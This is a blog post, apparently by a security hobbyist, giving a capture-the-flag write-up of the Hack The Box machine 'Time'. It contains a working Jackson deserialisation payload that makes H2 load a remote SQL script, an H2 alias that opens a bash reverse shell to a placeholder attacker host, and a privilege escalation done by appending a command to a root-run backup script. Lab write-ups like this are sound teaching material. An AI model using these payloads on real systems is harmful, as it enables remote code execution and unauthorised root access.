@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>HTB Write-up | Time</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=07034698ec" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="https://inesmartins.github.io//htb-write-up-time/" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="https://inesmartins.github.io//htb-write-up-time/amp/" />
+    
+    <meta property="og:site_name" content="Inês Martins" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="HTB Write-up | Time" />
+    <meta property="og:description" content="Retired machine can be found here.ScanningIt seems like this machine is running OpenSSH on port 22 and an Apache web server on port 80: ~ nmap -sC -sV time.htb PORT   STATE SERVICE VERSION PORT     STATE    SERVICE        VERSION 22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux;" />
+    <meta property="og:url" content="https://inesmartins.github.io//htb-write-up-time/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2021/04/banner.png" />
+    <meta property="article:published_time" content="2021-04-03T13:50:00.000Z" />
+    <meta property="article:modified_time" content="2021-04-03T14:16:02.000Z" />
+    <meta property="article:tag" content="htb" />
+    <meta property="article:tag" content="jackson" />
+    <meta property="article:tag" content="deserialization" />
+    <meta property="article:tag" content="deserialisation" />
+    <meta property="article:tag" content="fasterxml" />
+    <meta property="article:tag" content="json" />
+    <meta property="article:tag" content="h2" />
+    <meta property="article:tag" content="sql" />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="HTB Write-up | Time" />
+    <meta name="twitter:description" content="Retired machine can be found here.ScanningIt seems like this machine is running OpenSSH on port 22 and an Apache web server on port 80: ~ nmap -sC -sV time.htb PORT   STATE SERVICE VERSION PORT     STATE    SERVICE        VERSION 22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux;" />
+    <meta name="twitter:url" content="https://inesmartins.github.io//htb-write-up-time/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2021/04/banner.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="htb, jackson, deserialization, deserialisation, fasterxml, json, h2, sql" />
+    <meta property="og:image:width" content="598" />
+    <meta property="og:image:height" content="379" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Inês Martins",
+        "url": "https://inesmartins.github.io//",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://inesmartins.github.io//favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Inês Martins",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://inesmartins.github.io//content/images/2020/07/0PFUtbOg_400x400.jpg",
+            "width": 400,
+            "height": 400
+        },
+        "url": "https://inesmartins.github.io//author/ines/",
+        "sameAs": []
+    },
+    "headline": "HTB Write-up | Time",
+    "url": "https://inesmartins.github.io//htb-write-up-time/",
+    "datePublished": "2021-04-03T13:50:00.000Z",
+    "dateModified": "2021-04-03T14:16:02.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://inesmartins.github.io//content/images/2021/04/banner.png",
+        "width": 598,
+        "height": 379
+    },
+    "keywords": "htb, jackson, deserialization, deserialisation, fasterxml, json, h2, sql",
+    "description": "&gt; Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/286].\nScanning\nIt seems like this machine is running OpenSSH on port 22 and an Apache web\nserver on port 80:\n\n~ nmap -sC -sV time.htb\n\nPORT   STATE SERVICE VERSION\nPORT     STATE    SERVICE        VERSION\n22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n80/tcp   open     http           Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://inesmartins.github.io//"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.18" />
+    <link rel="alternate" type="application/rss+xml" title="Inês Martins" href="https://inesmartins.github.io//rss/" />
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180659126-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180659126-1');
+</script>
+
+</head>
+<body class="post-template tag-htb tag-jackson tag-deserialization tag-deserialisation tag-fasterxml tag-json tag-h2 tag-sql">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header">
+    <div class="outer site-nav-main">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left-wrapper">
+        <div class="site-nav-left">
+                <a class="site-nav-logo" href="https://inesmartins.github.io/">Inês Martins</a>
+            <div class="site-nav-content">
+                    <ul class="nav">
+    <li class="nav-home"><a href="https://inesmartins.github.io//">Home</a></li>
+</ul>
+
+                    <span class="nav-post-title dash">HTB Write-up | Time</span>
+            </div>
+        </div>
+    </div>
+    <div class="site-nav-right">
+            <div class="social-links">
+            </div>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://inesmartins.github.io//rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
+</a>
+
+    </div>
+</nav>
+    </div>
+</div></header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post tag-htb tag-jackson tag-deserialization tag-deserialisation tag-fasterxml tag-json tag-h2 tag-sql ">
+
+            <header class="post-full-header">
+
+                <section class="post-full-tags">
+                    <a href="/tag/htb/">htb</a>
+                </section>
+
+                <h1 class="post-full-title">HTB Write-up | Time</h1>
+
+
+                <div class="post-full-byline">
+
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+                            <li class="author-list-item">
+
+                                <div class="author-card">
+                                    <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                                    <div class="author-info">
+                                        <h2>Inês Martins</h2>
+                                        <p>Read <a href="/author/ines/">more posts</a> by this author.</p>
+                                    </div>
+                                </div>
+
+                                <a href="/author/ines/" class="author-avatar">
+                                    <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                                </a>
+
+                            </li>
+                        </ul>
+
+                        <section class="post-full-byline-meta">
+                            <h4 class="author-name"><a href="/author/ines/">Inês Martins</a></h4>
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2021-04-03">3 Apr 2021</time>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 3 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+            <figure class="post-full-image">
+                <img
+                    srcset="/content/images/size/w300/2021/04/banner.png 300w,
+                            /content/images/size/w600/2021/04/banner.png 600w,
+                            /content/images/size/w1000/2021/04/banner.png 1000w,
+                            /content/images/size/w2000/2021/04/banner.png 2000w"
+                    sizes="(max-width: 800px) 400px,
+                        (max-width: 1170px) 1170px,
+                            2000px"
+                    src="/content/images/size/w2000/2021/04/banner.png"
+                    alt="HTB Write-up | Time"
+                />
+            </figure>
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/286">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>It seems like this machine is running <code>OpenSSH</code> on port 22 and an <code>Apache</code> web server on port 80:</p><pre><code>~ nmap -sC -sV time.htb
+
+PORT   STATE SERVICE VERSION
+PORT     STATE    SERVICE        VERSION
+22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http           Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Online JSON parser</code></pre><p>When we access the website, we see a simple JSON "beautifier" and validator.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/10/image-2.png" class="kg-image"></figure><p>After submitting a couple of invalid JSON objects, it was clear from the error responses that the JSON was being parsed and validated using <a href="https://github.com/FasterXML/jackson-docshttps://github.com/FasterXML/jackson">Jackson</a>:</p><pre><code>Validation failed: Unhandled Java exception:
+com.fasterxml.jackson.databind.exc.MismatchedInputException: 
+Unexpected token (START_OBJECT), expected VALUE_STRING: 
+need JSON String that contains type id (for subtype of java.lang.Object)</code></pre><p>Turns out this parser has <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-15866/product_id-34008/Fasterxml-Jackson.html">3 CVEs</a>, all to do with deserialisation vulnerabilities.</p><p><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">This</a> is a very good article that explains the root of these vulnerabilities and how to exploit them.</p><hr><h2 id="exploiting-jackson">Exploiting Jackson</h2><p>Since this version of Jackson already blocklists some insecure types, I had to rely on <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">this</a> BlackHat presentation from 2019 to find a valid exploit:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/11/image-1.png" class="kg-image"></figure><p>After going through <a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">this</a> article, I realised that the easiest way to achieve an RCE using <code>DriverManagerConnectionSource</code> would be to abuse H2's <a href="http://www.h2database.com/html/features.html#execute_sql_on_connection">INIT=RUNSCRIPT FROM</a> feature. </p><p>Using this option, a database can be initialised with a SQL file that's hosted on the attacker's machine (I used <code>python -m SimpleHTTPServer 8000</code> to serve it).</p><pre><code class="language-JSON">[
+    "ch.qos.logback.core.db.DriverManagerConnectionSource", 
+    {
+    	"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://[attacker-ip]:8000/inject.sql'"
+     }
+]</code></pre><p>This SQL file also abuses an H2 feature - <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">Database ALIAS</a> - to create the reverse shell, as shown below:</p><pre><code class="language-SQL">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+    String[] command = {"bash", "-c", cmd};
+    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+    return s.hasNext() ? s.next() : "";  }$$;
+CALL SHELLEXEC('bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[attacker-port] 0&gt;&amp;1')</code></pre><p>And we get a shell as <code>pericles</code>, which in this case also gives us the ability to read the user flag!</p><hr><h2 id="pericles-gets-root">pericles gets root</h2><p>While looking for files that belonged to group <code>pericles</code>, I saw something that caught my eye:</p><pre><code>pericles@time:~$ find / -group pericles
+
+...
+/usr/bin/timer_backup.sh
+...</code></pre><pre><code>pericles@time:~$ cat /usr/bin/timer_backup.sh
+#!/bin/bash
+zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip</code></pre><p>It looks like this script is periodically zipping the <code>/var/www/html</code> directory and then moving the zip file to the <code>root</code> directory.</p><p>This means that the script<em> can</em> access the <code>root</code> directory, which we can abuse by adding an extra line to it that writes the root flag to a directory accessible to our user, such as <code>tmp</code>:</p><pre><code>pericles@time:~$ echo 'cat /root/root.txt &gt; /tmp/out' &gt;&gt; /usr/bin/timer_backup.sh
+
+pericles@time:~$ cat  /usr/bin/timer_backup.sh
+#!/bin/bash
+zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip
+cat /root/root.txt &gt; /tmp/out</code></pre><p>Our <code>root</code> flag is now at <code>/tmp/out</code>.</p><p>And we're done 😊</p>
+                </div>
+            </section>
+
+
+
+        </article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+                <article class="read-next-card">
+                    <header class="read-next-card-header">
+                        <h3><span>More in</span> <a href="/tag/htb/">htb</a></h3>
+                    </header>
+                    <div class="read-next-card-content">
+                        <ul>
+                            <li>
+                                <h4><a href="/htb-crypto-challenge-call/">HTB Crypto Challenge | Call</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-11-22">22 Nov 2020</time> –
+                                        1 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="/htb-write-up-tabby/">HTB Write-up | Tabby</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-11-07">7 Nov 2020</time> –
+                                        4 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="/htb-crypto-challenge/">HTB Crypto Challenge | Bank Heist</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-10-22">22 Oct 2020</time> –
+                                        1 min read</p>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                    <footer class="read-next-card-footer">
+                        <a href="/tag/htb/">See all 8 posts
+                            →</a>
+                    </footer>
+                </article>
+
+
+                <article class="post-card post tag-cryptography tag-oposec tag-shamir ">
+
+    <a class="post-card-image-link" href="/oposec-secrets/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2021/03/highres_471963990-1-1.jpeg 300w,
+                    /content/images/size/w600/2021/03/highres_471963990-1-1.jpeg 600w,
+                    /content/images/size/w1000/2021/03/highres_471963990-1-1.jpeg 1000w,
+                    /content/images/size/w2000/2021/03/highres_471963990-1-1.jpeg 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            loading="lazy"
+            src="/content/images/size/w600/2021/03/highres_471963990-1-1.jpeg"
+            alt="ØxOPOSɆC - Secrets [Crypto]"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/oposec-secrets/">
+
+            <header class="post-card-header">
+                    <div class="post-card-primary-tag">cryptography</div>
+                <h2 class="post-card-title">ØxOPOSɆC - Secrets [Crypto]</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>We all have secrets! And sometimes we need to share them with our online friends, safely... That's easy! - Just implement a very secure, hackerproof™ secret sharing web application!" URL:</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        Inês Martins
+                    </div>
+            
+                    <a href="/author/ines/" class="static-avatar">
+                        <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/ines/">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2021-03-24">24 Mar 2021</time> <span class="bull">&bull;</span> 3 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+        </div>
+    </div>
+</aside>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://inesmartins.github.io/">Inês Martins</a> &copy; 2021</section>
+                <nav class="site-footer-nav">
+                    <a href="https://inesmartins.github.io/">Latest Posts</a>
+                    
+                    
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+
+    <script
+        src="https://code.jquery.com/jquery-3.4.1.min.js"
+        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+        crossorigin="anonymous">
+    </script>
+    <script src="/assets/built/casper.js?v=07034698ec"></script>
+
+    <script>
+        // Parse the URL parameter
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Give the parameter a variable name
+        var action = getParameterByName('action');
+
+        $(document).ready(function () {
+            if (action == 'subscribe') {
+                $('body').addClass("subscribe-success");
+            }
+
+            $('.subscribe-success-message .subscribe-close').click(function () {
+                $('.subscribe-success-message').addClass('close');
+            });
+
+            // Reset form on opening subscrion overlay
+            $('.subscribe-button').click(function() {
+                $('.subscribe-overlay form').removeClass();
+                $('.subscribe-email').val('');
+            });
+        });
+    </script>
+
+    <script>
+    $(document).ready(function () {
+        // FitVids - start
+        var $postContent = $(".post-full-content");
+        $postContent.fitVids();
+        // FitVids - end
+
+        // Replace nav with title on scroll - start
+        Casper.stickyNavTitle({
+            navSelector: '.site-nav-main',
+            titleSelector: '.post-full-title',
+            activeClass: 'nav-post-title-active'
+        });
+        // Replace nav with title on scroll - end
+
+        // Hover on avatar
+        var hoverTimeout;
+        $('.author-list-item').hover(function () {
+            var $this = $(this);
+
+            clearTimeout(hoverTimeout);
+
+            $('.author-card').removeClass('hovered');
+            $(this).children('.author-card').addClass('hovered');
+
+        }, function () {
+            var $this = $(this);
+
+            hoverTimeout = setTimeout(function () {
+                $this.children('.author-card').removeClass('hovered');
+            }, 800);
+        });
+    });
+</script>
+
+
+    <div class="site-footer outer" style="background:#090a0b;margin-top:-60px;">
+    <div class="site-footer-content footer inner" style="margin-bottom:-20px">
+        <script src="https://www.hackthebox.eu/badge/172261"></script>
+    </div>
+</div>
+
+</body>
+</html>
